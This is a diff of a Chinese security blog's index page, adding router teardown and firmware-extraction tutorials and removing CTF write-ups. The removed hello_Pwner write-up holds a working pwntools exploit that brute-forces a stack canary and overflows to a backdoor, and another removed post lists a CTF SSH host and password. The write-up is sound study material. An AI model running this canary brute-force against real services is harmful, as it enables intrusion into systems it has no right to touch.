@@ -155,7 +155,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
           <a href="/archives">
-          <span class="site-state-item-count">24</span>
+          <span class="site-state-item-count">26</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -185,6 +185,256 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://xiaosolll.github.io/2022/01/26/TL-WR842N%E6%8B%86%E5%8D%B8%E5%8F%8A%E5%85%B6%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="eetan">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Antinomy">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/01/26/TL-WR842N%E6%8B%86%E5%8D%B8%E5%8F%8A%E5%85%B6%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96/" class="post-title-link" itemprop="url">TL_WR842N拆卸及其固件提取</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2022-01-26 20:02:30 / Modified: 21:32:52" itemprop="dateCreated datePublished" datetime="2022-01-26T20:02:30+08:00">2022-01-26</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="路由器型号及其拆卸"><a href="#路由器型号及其拆卸" class="headerlink" title="路由器型号及其拆卸"></a>路由器型号及其拆卸</h2><p>型号：TL_WR842N version 4.1</p>
+<p>拆卸步骤：将背面的两颗螺丝拧开，再大力沿着边沿将路由器撬开。</p>
+<p><img src="https://i.imgur.com/uF9Sbnr.png"></p>
+<p><img src="https://i.imgur.com/Ztej0mA.jpeg"></p>
+<p><img src="https://i.imgur.com/2UFKZIj.png"></p>
+<p>可以看到flash为：cfeon f80-100hcp,在编程器中为EN25F80。</p>
+<h2 id="免拆提取固件"><a href="#免拆提取固件" class="headerlink" title="免拆提取固件"></a>免拆提取固件</h2><h3 id="准备工具："><a href="#准备工具：" class="headerlink" title="准备工具："></a>准备工具：</h3><p>1.芯片测试夹/烧录夹</p>
+<p>2.夹子转换板</p>
+<p>3.ch31A编程器</p>
+<p><img src="https://i.imgur.com/uZj5rUG.png"></p>
+<p>注意的点：</p>
+<p>1.芯片测试夹的红线分别是在芯片的1号脚和转换板的一号脚</p>
+<p>2.芯片的一号脚处有个小圆点供分辨</p>
+<p>3.编程器的拉杆竖直状态为断开，平行于底部为连接。</p>
+<p>最终的连接效果如下图：</p>
+<p>【图一】</p>
+<p><img src="https://i.imgur.com/PKZG5Ko.jpeg"></p>
+<p>【图二】</p>
+<p><img src="https://i.imgur.com/2u0CV1Y.png"></p>
+<p>【图三】白色圆点所在位置为1号脚</p>
+<p><img src="https://i.imgur.com/NbpiFzZ.png"></p>
+<h3 id="提取步骤："><a href="#提取步骤：" class="headerlink" title="提取步骤："></a>提取步骤：</h3><p><strong>首先</strong>把芯片测试夹的尾端与夹子转换板连接在一起，注意红线与一号脚对应。</p>
+<p><strong>其次</strong>将架子转换板的背面夹在编程器上，注意一脚对应的位置和路由器flash型号是25系列的。加好后将编程器插入电脑的usb接口。可以发现电源灯亮起为红色。</p>
+<p><strong>接下来</strong>将芯片测试夹夹住芯片，如果成功夹好则路由器芯片一排灯会全部亮起，过一两秒只留下一个亮灯，而编程器的读写灯也会亮起一两秒。</p>
+<p>编程器驱动可以在官网下载，驱动成功后就能打开编程器。</p>
+<p><img src="https://i.imgur.com/FogHokB.png"></p>
+<p>先预备setup，驱动成功则下面一个正式安装。</p>
+<h3 id="编程器软件"><a href="#编程器软件" class="headerlink" title="编程器软件"></a>编程器软件</h3><p><img src="https://i.imgur.com/4FtGsOc.png"></p>
+<h4 id="【–成功连接右下角有‘已连接’】"><a href="#【–成功连接右下角有‘已连接’】" class="headerlink" title="【–成功连接右下角有‘已连接’】"></a>【–成功连接右下角有‘已连接’】</h4><p><img src="https://i.imgur.com/ROD2y1I.png"></p>
+<h4 id="【–按照类型厂商名称查找并且检测】"><a href="#【–按照类型厂商名称查找并且检测】" class="headerlink" title="【–按照类型厂商名称查找并且检测】"></a>【–按照类型厂商名称查找并且检测】</h4><blockquote>
+<p>现象：检测开始路由器上的亮灯闪烁。</p>
+</blockquote>
+<p>如果后四位全部是FF则代表接触失败，需要重新调整芯片测试夹或者前面的步骤是否有误。</p>
+<p><img src="https://i.imgur.com/AFnvtan.png"></p>
+<h4 id="【–读取】"><a href="#【–读取】" class="headerlink" title="【–读取】"></a>【–读取】</h4><p>单击读取则会将flash里面的内容读出，然后保存下来就是我们常用的bin文件了。</p>
+<p><img src="https://i.imgur.com/9Lkg5rQ.png"></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://xiaosolll.github.io/2021/12/26/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98-01/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="eetan">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Antinomy">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/12/26/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98-01/" class="post-title-link" itemprop="url">路由器漏洞挖掘_01</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-12-26 18:00:08" itemprop="dateCreated datePublished" datetime="2021-12-26T18:00:08+08:00">2021-12-26</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">Edited on</span>
+        <time title="Modified: 2021-12-30 20:43:11" itemprop="dateModified" datetime="2021-12-30T20:43:11+08:00">2021-12-30</time>
+      </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>,</p>
+<h2 id="路由器基础"><a href="#路由器基础" class="headerlink" title="路由器基础"></a>路由器基础</h2><p>路由器很多是基于linux，路由器的linux系统有两个特点，一个是指令架构多采用MIPS和ARM这两种指令架构。二是路由器的shell是基于busybox的。</p>
+<blockquote>
+<p>mips:risc精简指令集，普遍用于小型设备的处理器架构。</p>
+<p>路由器的根文件系统与linux系统基本上是一致的，根文件系统下通常有usr、sys、proc、lib、etc、bin、var、tmp、sbin、mnt、include、home及其dev目录。</p>
+<p>bin、sbin及其usr目录下的bin和usr目录下的bin、sbin：都是用于存方路由器中的应用程序的目录。</p>
+<p>lib和usr目录下的lib：是用于存放程序运行时需要的动态库文件的目录。</p>
+<p>etc目录：用于存放路由器配置文件，比如程序自启动配置文件、脚本文件及其各种服务程序的配置文件，比如web服务器的配置文件。</p>
+<p>busybox：在路由器系统中支持的shell都指向busybox的符号链接。（busybox –help）</p>
+</blockquote>
+<p>在路由器安全研究中常用的文本编辑器：nano编辑器、vi编辑器</p>
+<p>编译工具gcc</p>
+<p>调试工具gdb</p>
+<h3 id="mips汇编语言"><a href="#mips汇编语言" class="headerlink" title="mips汇编语言"></a>mips汇编语言</h3><h4 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h4><p>通用寄存器、特殊寄存器</p>
+<h4 id="字节序"><a href="#字节序" class="headerlink" title="字节序"></a>字节序</h4><p>数据在存储器中是按照字节存放，处理器也按照字节访问存储器中的指令或者数据。</p>
+<h4 id="mips寻址方式"><a href="#mips寻址方式" class="headerlink" title="mips寻址方式"></a>mips寻址方式</h4><p>寄存器寻址</p>
+<p>立即数寻址</p>
+<p>寄存器相对寻址：主要用于加载、存储指令使用</p>
+<p>pc相对寻址：主要被转移指令使用</p>
+<p><img src="https://i.imgur.com/r5U6te7.png"></p>
+<h4 id="mips指令集特点"><a href="#mips指令集特点" class="headerlink" title="mips指令集特点"></a>mips指令集特点</h4><p>1.mips固定4字节指令长度</p>
+<p>2.mips默认不把子函数的返回地址存放到栈中，而是存放在$31（$ra）寄存器中，这对叶子函数有利，对于嵌套函数，会有其他机制处理。</p>
+<p>3.流水线效应，一个最重要的效应就是分支延迟效应。</p>
+<blockquote>
+<p>在分支跳转语句后面的那条语句叫做分支延迟槽。。。</p>
+</blockquote>
+<h4 id="指令格式"><a href="#指令格式" class="headerlink" title="指令格式"></a>指令格式</h4><h3 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h3><h4 id="http协议"><a href="#http协议" class="headerlink" title="http协议"></a>http协议</h4><p>http请求由3部分组成：请求行、消息报头、请求正文</p>
+<h4 id="请求行"><a href="#请求行" class="headerlink" title="请求行"></a>请求行</h4><p>method request-URI HTTP-version CRLF</p>
+<p>method：请求方法</p>
+<blockquote>
+<p>GET、POST、HEAD、PUT、DELETE、TRACE、CONNECT、OPTIONS</p>
+<p>get方法提交的数据作为url请求的一部分出现，不能用于提交大量数据</p>
+<p>post方法不会作为url请求的一部分，而是作为标准数据传送给web服务器。</p>
+</blockquote>
+<p>request-URI：统一资源标识符</p>
+<p>http-version：标识请求的http协议版本</p>
+<p>crlf：标识回车和换行</p>
+<h4 id="消息报头"><a href="#消息报头" class="headerlink" title="消息报头"></a>消息报头</h4><p>http消息由客户端到服务器的请求+服务器到客户端的响应组成。也就是包括了请求消息和响应消息。</p>
+<h5 id="请求消息报头"><a href="#请求消息报头" class="headerlink" title="请求消息报头"></a>请求消息报头</h5><p>名字+：+空格+值</p>
+<p>accept：</p>
+<blockquote>
+<p>accept:image/gif   表明客户端希望接受GIF图像格式的资源</p>
+<p>accept:text/html  表明客户端希望接受html文本</p>
+</blockquote>
+<p>accept-encoding</p>
+<blockquote>
+<p>accept-encoding:gzip.deflate   指定可接受的内容编码</p>
+<p>如果没有设置这个域标识服务器假定客户端可以接受各种语言的编码</p>
+</blockquote>
+<p>cookie</p>
+<blockquote>
+<p>cookie:YWRtaW46YMRtaW4=  用于客户端向服务器提交cookie信息验证</p>
+</blockquote>
+<p>accept-language</p>
+<blockquote>
+<p>accept-language：zh-cn  用于指定一种自然语言</p>
+</blockquote>
+<p>authorization</p>
+<blockquote>
+<p>主要用于证明客户端有权查看某个资源</p>
+</blockquote>
+<p>host</p>
+<blockquote>
+<p>主要用于指定被请求资源的internet主机和端口号，通常从http url中提取出来。</p>
+<p>比如“<a target="_blank" rel="noopener" href="http://www.baidu.com/index.html%E2%80%9D">http://www.baidu.com/index.html”</a></p>
+<p>其host请求报头域：HOST：<a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a>  这里默认端口号为80</p>
+<p>如果指定端口号：host： <a href="http://www.baidu.com:指定端口号">www.baidu.com:指定端口号</a></p>
+</blockquote>
+<p>user-agent</p>
+<blockquote>
+<p>它允许客户端将自己的操作系统、浏览器和其他属性高速服务器。</p>
+</blockquote>
+<h4 id="http协议请求正文"><a href="#http协议请求正文" class="headerlink" title="http协议请求正文"></a>http协议请求正文</h4><p>请求头和请求正文之间是一个空行，空行表示请求头已经结束，接下来的内容是请求正文。</p>
+<p>请求正文中可以包含客户提交的查询字符串信息。</p>
+<h3 id="ida的mips插件和脚本：p52"><a href="#ida的mips插件和脚本：p52" class="headerlink" title="ida的mips插件和脚本：p52"></a>ida的mips插件和脚本：p52</h3><h3 id="binwalk"><a href="#binwalk" class="headerlink" title="binwalk"></a>binwalk</h3><p>-h</p>
+<p>–help</p>
+<p>-e  提取文件</p>
+<p>-M 根据扫描结果进行递归提取，仅对-e和–dd选项有效</p>
+<p>脚本—IDC语言、python</p>
+<p><img src="https://i.imgur.com/KdSaeXO.png"></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1310,10 +1560,16 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">Posted on</span>
-      
 
-      <time title="Created: 2021-07-18 19:10:54 / Modified: 19:11:06" itemprop="dateCreated datePublished" datetime="2021-07-18T19:10:54+08:00">2021-07-18</time>
+      <time title="Created: 2021-07-18 19:10:54" itemprop="dateCreated datePublished" datetime="2021-07-18T19:10:54+08:00">2021-07-18</time>
     </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">Edited on</span>
+        <time title="Modified: 2022-01-10 18:12:33" itemprop="dateModified" datetime="2022-01-10T18:12:33+08:00">2022-01-10</time>
+      </span>
 
   
 </div>
@@ -1325,7 +1581,17 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          
+          <p><a target="_blank" rel="noopener" href="https://delikely.github.io/2021/01/11/%E5%85%8D%E6%8B%86%E8%8A%AF%E7%89%87%E6%8F%90%E5%8F%96%E5%9B%BA%E4%BB%B6/">https://delikely.github.io/2021/01/11/%E5%85%8D%E6%8B%86%E8%8A%AF%E7%89%87%E6%8F%90%E5%8F%96%E5%9B%BA%E4%BB%B6/</a></p>
+<p>​                                   ———–免拆芯片提取固件（高质量）</p>
+<p>1.热风枪吹，将flash拿下来放进flash编程器中读取</p>
+<p>2.内含芯片封装和针脚的知识</p>
+<p>3.当固件没有被存储在外置的flash上，而是在mcu的内置flash中，这时候需要通过调试接口（swd/jtag等）对固件进行提取，也可以动态调试。</p>
+<p><a target="_blank" rel="noopener" href="https://yaseng.org/iot-security-hardware-obtain.html">https://yaseng.org/iot-security-hardware-obtain.html</a></p>
+<p>​         ————-编程器直接提取固件的方法（基础）</p>
+<p>购入设备：</p>
+<p>编程器</p>
+<p>芯片测试夹</p>
+
       
     </div>
 
@@ -1745,182 +2011,6 @@
 
 
 
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://xiaosolll.github.io/2021/05/09/iscc-hello-Pwner-wp/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="eetan">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Antinomy">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/05/09/iscc-hello-Pwner-wp/" class="post-title-link" itemprop="url">iscc_hello_Pwner_wp</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2021-05-09 11:51:39 / Modified: 12:37:21" itemprop="dateCreated datePublished" datetime="2021-05-09T11:51:39+08:00">2021-05-09</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="iscc-hello-pwner-wp"><a href="#iscc-hello-pwner-wp" class="headerlink" title="iscc_hello_pwner_wp"></a>iscc_hello_pwner_wp</h1><blockquote>
-<p>one-by-one 爆破Canary原理</p>
-<p>1.对于Canary，虽然每次进程重启后Canary不同，但是同一个进程中的不同线程的Cannary是相同的，并且通过fork函数创建的子进程中的canary也是相同的，因为fork函数会直接拷贝父进程的内存。</p>
-<p>2.最低位为0x00，之后逐次爆破，如果canary爆破不成功，则程序崩溃；爆破成功则程序进行下面的逻辑。由此可判断爆破是否成功。</p>
-</blockquote>
-<h2 id="主函数"><a href="#主函数" class="headerlink" title="主函数"></a>主函数</h2><p><img src="https://i.imgur.com/wkVw66U.png"></p>
-<p>无限循环fork()子进程</p>
-<p>进入vuln()函数：</p>
-<h2 id="vuln"><a href="#vuln" class="headerlink" title="vuln()"></a>vuln()</h2><p><img src="https://i.imgur.com/M6f5TTi.png"></p>
-<p>可以看到v1正是canary，其位置在ebp-0xc。</p>
-<p>缓冲区在ebp-0x70的位置。</p>
-<h2 id="后门函数"><a href="#后门函数" class="headerlink" title="后门函数"></a>后门函数</h2><p><img src="https://i.imgur.com/NXpaIJh.png"></p>
-<h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><blockquote>
-<p>LD_PRELOAD=/lib/i386-linux-gnu/libc.so.6 ./hello_Pwner</p>
-<p>ps -el</p>
-<p>sudo gdb attach  pid</p>
-</blockquote>
-<p><img src="https://i.imgur.com/E5SiKcM.png"></p>
-<p>动态调试发现backdoor的地址和read_plt的地址只有后四位不同，后三位各函数都是固定的，于是只需要爆破第四位就行。</p>
-<h2 id="爆破canary"><a href="#爆破canary" class="headerlink" title="爆破canary"></a>爆破canary</h2><blockquote>
-<p><em>anary</em>一般是尾随的(也有特殊情况,具体看作者的汇编情况),在32位下是4个<em>字节</em>,64位下是8个<em>字节</em>(最低位都是\x00) </p>
-</blockquote>
-<p>这里通过循环实现对剩余七个字节的爆破，（CANARY的最低字节为00）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">canary &#x3D; &#39;\x00&#39;</span><br><span class="line">for k in range(3):</span><br><span class="line">    for i in range(256):</span><br><span class="line">        print &quot;the &quot; + str(k) + &quot;: &quot; + chr(i)</span><br><span class="line">        p.send(&#39;a&#39;*100 + canary + chr(i))</span><br><span class="line">        a &#x3D; p.recvuntil(&quot;Hello,Pwner!\n&quot;)</span><br><span class="line">        print a</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        if &quot;*** stack smashing detected ***: .&#x2F;hello_Pwner terminated\n&quot; in a:</span><br><span class="line">            continue</span><br><span class="line">        else:</span><br><span class="line">                canary +&#x3D; chr(i)</span><br><span class="line">                print &quot;canary: &quot; + canary</span><br><span class="line">                break</span><br></pre></td></tr></table></figure>
-
-
-<p>payload = ‘A’ * 100 + canary + ‘A’ * 12 + “\xba\x<strong>7</strong>7”</p>
-<blockquote>
-<p>这个7可以换成0-f的任意一个</p>
-</blockquote>
-<p>最后的exp：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line">context.terminal &#x3D; [&#39;gnome-terminal&#39;,&#39;-x&#39;,&#39;bash&#39;,&#39;-c&#39;]</span><br><span class="line">context(arch&#x3D;&#39;i386&#39;, os&#x3D;&#39;linux&#39;)</span><br><span class="line">local &#x3D; 1</span><br><span class="line">elf &#x3D; ELF(&#39;.&#x2F;hello_Pwner&#39;)</span><br><span class="line"></span><br><span class="line">if local:</span><br><span class="line">    p &#x3D; process(&#39;.&#x2F;hello_Pwner&#39;)</span><br><span class="line">    elf&#x3D;ELF(&#39;.&#x2F;hello_Pwner&#39;)</span><br><span class="line">    #libc &#x3D; ELF(&quot;.&#x2F;libc.so.6&quot;)</span><br><span class="line"></span><br><span class="line">else:</span><br><span class="line">    p &#x3D; remote(&#39;39.96.88.40&#39;,8010)</span><br><span class="line">    libc &#x3D; ELF(&#39;.&#x2F;hello_Pwner&#39;)</span><br><span class="line">p.recvuntil(&#39;Hello,Pwner!\n&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">puts_plt &#x3D; elf.plt[&#39;puts&#39;]</span><br><span class="line">puts_gots&#x3D;elf.got[&#39;puts&#39;]</span><br><span class="line">print p32(puts_plt)</span><br><span class="line"></span><br><span class="line">canary &#x3D; &#39;\x00&#39;</span><br><span class="line">for k in range(3):</span><br><span class="line">    for i in range(256):</span><br><span class="line">        print &quot;the &quot; + str(k) + &quot;: &quot; + chr(i)</span><br><span class="line">        p.send(&#39;a&#39;*100 + canary + chr(i))</span><br><span class="line">        a &#x3D; p.recvuntil(&quot;Hello,Pwner!\n&quot;)</span><br><span class="line">        print a</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        if &quot;*** stack smashing detected ***: &lt;unknown&gt; terminated\n&quot; in a:</span><br><span class="line">            continue</span><br><span class="line">        else:</span><br><span class="line">                canary +&#x3D; chr(i)</span><br><span class="line">                print &quot;canary: &quot; + canary</span><br><span class="line">                break</span><br><span class="line">payload &#x3D; &#39;A&#39; * 100 + canary + &#39;A&#39; * 12 + &quot;\xba\x77&quot;#read  and back zhi you  hou si ge zi jie bu yi yang</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-
-<p> 对远端多次运行exp，总有一次成功。</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://xiaosolll.github.io/2021/05/02/iscc-pwn1/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="eetan">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Antinomy">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/05/02/iscc-pwn1/" class="post-title-link" itemprop="url">iscc_pwn1</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2021-05-02 15:04:00 / Modified: 19:07:29" itemprop="dateCreated datePublished" datetime="2021-05-02T15:04:00+08:00">2021-05-02</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="pwn1-练武"><a href="#pwn1-练武" class="headerlink" title="pwn1-练武"></a>pwn1-练武</h1><p>知识点：</p>
-<blockquote>
-<p>整数溢出绕过判断</p>
-<p>栈溢出</p>
-</blockquote>
-<p>迷惑点：</p>
-<blockquote>
-<p>为什么不行</p>
-</blockquote>
-<p>10.10.45.78   22000   –ssh</p>
-<p>zh:ctf</p>
-<p>:123456qaz</p>
-<p>别人：10000</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
   <nav class="pagination">
     <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
   </nav>
@@ -1956,7 +2046,7 @@
 
 <div class="copyright">
   &copy; 
-  <span itemprop="copyrightYear">2021</span>
+  <span itemprop="copyrightYear">2022</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
